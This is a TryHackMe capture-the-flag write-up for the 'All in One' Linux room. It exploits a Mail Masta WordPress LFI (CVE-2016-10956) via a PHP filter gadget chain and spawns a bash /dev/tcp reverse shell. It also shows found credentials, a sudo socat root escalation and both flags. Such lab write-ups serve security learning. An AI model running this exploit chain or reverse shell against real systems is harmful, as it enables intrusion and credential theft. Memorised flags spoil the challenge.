| Category          | Details                                                                              |
|-------------------|--------------------------------------------------------------------------------------|
| 📝 **Name**       | [All in One](https://tryhackme.com/room/allinonemj)                                  |  
| 🏷 **Type**       | THM Challenge                                                                        |
| 🖥 **OS**         | Linux                                                                                |
| 🎯 **Difficulty** | Easy                                                                                 |
| 📁 **Tags**       | WordPress, CVE-2016-10956, LFI, php:// wrappers, PHP filter gadget chain, sudo socat |

## Task 1: Hack the machine !

### user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ nmap -sS -sC -sV -p- $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-11 18:05 +0100
Nmap scan report for 10.80.157.169
Host is up (0.039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.131.53
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 83:a0:3b:95:c5:10:c7:5c:aa:36:b0:fa:a1:7f:4a:f7 (RSA)
|   256 24:05:16:90:34:87:54:8d:eb:12:18:17:a4:cf:70:d5 (ECDSA)
|_  256 01:ce:25:46:a3:a4:c7:b5:fc:08:c5:fb:fd:1f:49:9d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.48 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,py,bak,log,sh,cgi -C 404
<SNIP>
301      GET        9l       28w      318c http://10.80.157.169/wordpress => http://10.80.157.169/wordpress/
<SNIP>
```
WordPress has been discovered at `/wordpress` endpoint

#### Enumerate WordPress with `wpscan`
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ wpscan --url http://$TARGET/wordpress --api-token *******************************************
<SNIP>
 | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
 |      - https://www.exploit-db.com/exploits/40290/
 |      - https://www.exploit-db.com/exploits/50226/
 |      - https://cxsecurity.com/issue/WLB-2016080220
 <SNIP>
```
Vulnerable `Mail Masta` plugin has been discovered. 

#### Confirm [CVE-2016-10956](https://nvd.nist.gov/vuln/detail/CVE-2016-10956) vulnerability
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ curl -s "http://$TARGET/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/etc/os-release" | base64 -d
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
We were able to access `/etc/os-release` file and what is more php:// wrappers were respected, which means we could try to use chain of PHP gadgets to execute PHP code.

#### Generate `system($_GET[1]);` PHP filter gadget chain
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ export GADGET_CHAIN=$(python3 ~/Tools/php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php system($_GET[1]); ?>' | tail -n 1)
```

#### Test generated gadget chain
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ curl 'http://'${TARGET}'/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?1=id&pl='${GADGET_CHAIN}'' --output -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
�
P�������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ nc -lvnp 4444                
listening on [any] 4444 ...
```

#### Spawn reverse shell connection
```
CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" | jq -sRr @uri)
curl 'http://'${TARGET}'/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?1='${CMD}'&pl='${GADGET_CHAIN}'' --output -
```

#### Confirm foothold gained
```
connect to [192.168.131.53] from (UNKNOWN) [10.80.157.169] 52038
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
<dpress/wp-content/plugins/mail-masta/inc/campaign$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Discover hint about user `elyana` password
```
<dpress/wp-content/plugins/mail-masta/inc/campaign$ cat /home/elyana/hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

#### Discover user `elyana` password in `/etc/mysql/conf.d/private.txt`
File has been located by `linpeas.sh`
```
<dpress/wp-content/plugins/mail-masta/inc/campaign$ cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
```

#### Access target over SSH using discover credentials
```
┌──(magicrc㉿perun)-[~/attack/THM All in One]
└─$ ssh elyana@$TARGET       
<SNIP>
elyana@ip-10-80-157-169:~$ id
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
```

#### Capture user flag
```
elyana@ip-10-80-157-169:~$ cat /home/elyana/user.txt | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```

### root.txt

#### List allowed sudo commands
```
elyana@ip-10-80-157-169:~$ sudo -l
Matching Defaults entries for elyana on ip-10-80-157-169:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on ip-10-80-157-169:
    (ALL) NOPASSWD: /usr/bin/socat
```

#### Escalate to `root` using `sudo socat`
```
elyana@ip-10-80-157-169:~$ sudo socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
cat /root/root.txt | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```
